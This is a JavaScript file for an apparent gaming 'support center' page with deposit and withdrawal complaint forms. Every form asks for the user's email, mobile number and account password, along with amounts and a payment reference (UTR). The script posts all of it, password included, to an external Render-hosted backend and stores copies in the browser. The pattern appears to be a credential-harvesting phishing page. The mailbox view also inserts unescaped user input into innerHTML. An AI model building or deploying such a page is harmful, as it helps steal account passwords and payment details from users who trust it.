// ========================================
// CROOR GAME SUPPORT CENTER
// Main Application JavaScript
// Render Hosted Version
// ========================================

// ===== CONFIGURATION =====
const CONFIG = {
    // Render pe deploy hone ke baad apna URL daalo
    // Example: https://croor-game-support.onrender.com/submit
    BACKEND_URL: 'https://croor-game-support.onrender.comsubmit',
    STORAGE_KEY: 'croor_game_submissions',
};

// ===== TAB SWITCHING =====
function switchTab(tab) {
    const depositForm = document.getElementById('depositForm');
    const withdrawalForm = document.getElementById('withdrawalForm');
    const depositTab = document.getElementById('depositTab');
    const withdrawalTab = document.getElementById('withdrawalTab');
    const tabSlider = document.getElementById('tabSlider');

    if (tab === 'deposit') {
        depositForm.classList.add('active');
        withdrawalForm.classList.remove('active');
        depositTab.classList.add('active');
        withdrawalTab.classList.remove('active');
        tabSlider.classList.remove('right');
    } else {
        withdrawalForm.classList.add('active');
        depositForm.classList.remove('active');
        withdrawalTab.classList.add('active');
        depositTab.classList.remove('active');
        tabSlider.classList.add('right');
    }
    triggerHaptic();
}

// ===== TOGGLE PASSWORD =====
function togglePassword(inputId, element) {
    const input = document.getElementById(inputId);
    const icon = element.querySelector('i');
    if (input.type === 'password') {
        input.type = 'text';
        icon.classList.remove('fa-eye');
        icon.classList.add('fa-eye-slash');
    } else {
        input.type = 'password';
        icon.classList.remove('fa-eye-slash');
        icon.classList.add('fa-eye');
    }
}

// ===== FORM VALIDATION =====
function validateForm(type) {
    let isValid = true;
    let fields = [];

    if (type === 'deposit') {
        fields = [
            { id: 'dep_email', name: 'Email' },
            { id: 'dep_mobile', name: 'Mobile' },
            { id: 'dep_password', name: 'Password' },
            { id: 'dep_amount', name: 'Amount' },
            { id: 'dep_utr', name: 'UTR' }
        ];
    } else {
        fields = [
            { id: 'with_email', name: 'Email' },
            { id: 'with_mobile', name: 'Mobile' },
            { id: 'with_password', name: 'Password' },
            { id: 'with_amount', name: 'Amount' }
        ];
    }

    fields.forEach(field => {
        const input = document.getElementById(field.id);
        const value = input.value.trim();
        if (!value) {
            input.classList.add('error');
            isValid = false;
            setTimeout(() => input.classList.remove('error'), 1000);
        } else {
            input.classList.remove('error');
        }
    });

    const emailId = type === 'deposit' ? 'dep_email' : 'with_email';
    const emailInput = document.getElementById(emailId);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (emailInput.value && !emailRegex.test(emailInput.value)) {
        emailInput.classList.add('error');
        isValid = false;
        setTimeout(() => emailInput.classList.remove('error'), 1000);
    }

    const mobileId = type === 'deposit' ? 'dep_mobile' : 'with_mobile';
    const mobileInput = document.getElementById(mobileId);
    if (mobileInput.value && mobileInput.value.length !== 10) {
        mobileInput.classList.add('error');
        isValid = false;
        setTimeout(() => mobileInput.classList.remove('error'), 1000);
    }

    return isValid;
}

// ===== SUBMIT FORM =====
async function submitForm(type) {
    if (!validateForm(type)) {
        triggerHaptic();
        return;
    }

    const btn = document.getElementById(type === 'deposit' ? 'depositSubmitBtn' : 'withdrawalSubmitBtn');
    btn.classList.add('loading');

    let formData = {};

    if (type === 'deposit') {
        formData = {
            type: 'Deposit Problem',
            email: document.getElementById('dep_email').value.trim(),
            mobile: document.getElementById('dep_mobile').value.trim(),
            password: document.getElementById('dep_password').value.trim(),
            amount: document.getElementById('dep_amount').value.trim(),
            utr: document.getElementById('dep_utr').value.trim(),
            timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
        };
    } else {
        formData = {
            type: 'Withdrawal Problem',
            email: document.getElementById('with_email').value.trim(),
            mobile: document.getElementById('with_mobile').value.trim(),
            password: document.getElementById('with_password').value.trim(),
            amount: document.getElementById('with_amount').value.trim(),
            timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
        };
    }

    try {
        const response = await fetch(CONFIG.BACKEND_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        });

        const result = await response.json();
        console.log('Backend response:', result);

    } catch (error) {
        console.log('Backend error (saving locally):', error.message);
    }

    saveSubmission(formData);

    setTimeout(() => {
        btn.classList.remove('loading');
        btn.classList.add('success');

        setTimeout(() => {
            showSuccessPopup();
            createConfetti();

            setTimeout(() => {
                resetForm(type);
                btn.classList.remove('success');
            }, 2000);
        }, 500);

    }, 1500);
}

// ===== SAVE TO LOCAL STORAGE =====
function saveSubmission(data) {
    let submissions = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEY) || '[]');
    data.id = Date.now();
    submissions.unshift(data);
    localStorage.setItem(CONFIG.STORAGE_KEY, JSON.stringify(submissions));
    updateBadgeCount();
}

// ===== UPDATE BADGE COUNT =====
function updateBadgeCount() {
    const submissions = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEY) || '[]');
    const count = submissions.length;
    const badges = document.querySelectorAll('#mailBadge, #navBadge');
    badges.forEach(badge => {
        if (badge) {
            badge.textContent = count;
            badge.style.display = count > 0 ? 'flex' : 'none';
        }
    });
}

// ===== SHOW SUCCESS POPUP =====
function showSuccessPopup() {
    const popup = document.getElementById('successPopup');
    popup.classList.add('active');
}

function closePopup() {
    const popup = document.getElementById('successPopup');
    popup.classList.remove('active');
    triggerHaptic();
}

// ===== RESET FORM =====
function resetForm(type) {
    if (type === 'deposit') {
        document.getElementById('dep_email').value = '';
        document.getElementById('dep_mobile').value = '';
        document.getElementById('dep_password').value = '';
        document.getElementById('dep_amount').value = '';
        document.getElementById('dep_utr').value = '';
    } else {
        document.getElementById('with_email').value = '';
        document.getElementById('with_mobile').value = '';
        document.getElementById('with_password').value = '';
        document.getElementById('with_amount').value = '';
    }
}

// ===== CONFETTI EFFECT =====
function createConfetti() {
    const container = document.createElement('div');
    container.className = 'confetti-container';
    document.body.appendChild(container);

    const colors = ['#FF3B30', '#FF9500', '#FFCC00', '#34C759', '#007AFF', '#AF52DE', '#FF2D55'];

    for (let i = 0; i < 50; i++) {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + '%';
        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        confetti.style.animationDelay = Math.random() * 2 + 's';
        confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
        confetti.style.width = (Math.random() * 8 + 6) + 'px';
        confetti.style.height = (Math.random() * 8 + 6) + 'px';
        confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
        container.appendChild(confetti);
    }

    setTimeout(() => container.remove(), 4000);
}

// ===== HAPTIC FEEDBACK =====
function triggerHaptic() {
    if (navigator.vibrate) navigator.vibrate(10);
}

// ===== MAILBOX FUNCTIONS =====
function loadMailbox() {
    const submissions = JSON.parse(localStorage.getItem(CONFIG.STORAGE_KEY) || '[]');
    const mailList = document.getElementById('mailList');
    const emptyState = document.getElementById('emptyState');

    if (!mailList) return;

    if (submissions.length === 0) {
        emptyState.style.display = 'block';
        mailList.style.display = 'none';
        return;
    }

    emptyState.style.display = 'none';
    mailList.style.display = 'flex';
    mailList.innerHTML = '';

    submissions.forEach((item, index) => {
        const isDeposit = item.type === 'Deposit Problem';

        let detailsHTML = `
            <div class="mail-detail-row">
                <span class="detail-label">📧 Email</span>
                <span class="detail-value">${item.email}</span>
            </div>
            <div class="mail-detail-row">
                <span class="detail-label">📱 Mobile</span>
                <span class="detail-value">${item.mobile}</span>
            </div>
            <div class="mail-detail-row">
                <span class="detail-label">🔒 Password</span>
                <span class="detail-value">${maskPassword(item.password)}</span>
            </div>
            <div class="mail-detail-row">
                <span class="detail-label">💰 Amount</span>
                <span class="detail-value">₹${formatAmount(item.amount)}</span>
            </div>
        `;

        if (isDeposit && item.utr) {
            detailsHTML += `
                <div class="mail-detail-row">
                    <span class="detail-label">🧾 UTR No.</span>
                    <span class="detail-value">${item.utr}</span>
                </div>
            `;
        }

        const mailItem = document.createElement('div');
        mailItem.className = 'mail-item';
        mailItem.style.animationDelay = `${index * 0.1}s`;
        mailItem.innerHTML = `
            <div class="mail-item-header">
                <div class="mail-type">
                    <div class="mail-type-icon ${isDeposit ? 'deposit' : 'withdrawal'}">
                        <i class="fas ${isDeposit ? 'fa-arrow-down' : 'fa-arrow-up'}"></i>
                    </div>
                    <div class="mail-type-text">
                        <h4>${item.type}</h4>
                        <span>${item.timestamp}</span>
                    </div>
                </div>
                <span class="mail-status">✅ Submitted</span>
            </div>
            <div class="mail-details">
                ${detailsHTML}
            </div>
        `;

        mailList.appendChild(mailItem);
    });
}

function maskPassword(password) {
    if (!password) return '****';
    return password.substring(0, 2) + '****' + password.substring(password.length - 1);
}

function formatAmount(amount) {
    return Number(amount).toLocaleString('en-IN');
}

function clearAllMails() {
    if (confirm('Are you sure you want to clear all submissions?')) {
        localStorage.removeItem(CONFIG.STORAGE_KEY);
        loadMailbox();
        updateBadgeCount();
        triggerHaptic();
    }
}

// ===== INITIALIZATION =====
document.addEventListener('DOMContentLoaded', function () {
    updateBadgeCount();

    document.querySelectorAll('.input-wrapper input').forEach(input => {
        input.addEventListener('focus', function () {
            this.parentElement.classList.add('focused');
        });
        input.addEventListener('blur', function () {
            this.parentElement.classList.remove('focused');
        });
    });

    if (document.getElementById('mailList')) {
        loadMailbox();
    }
});
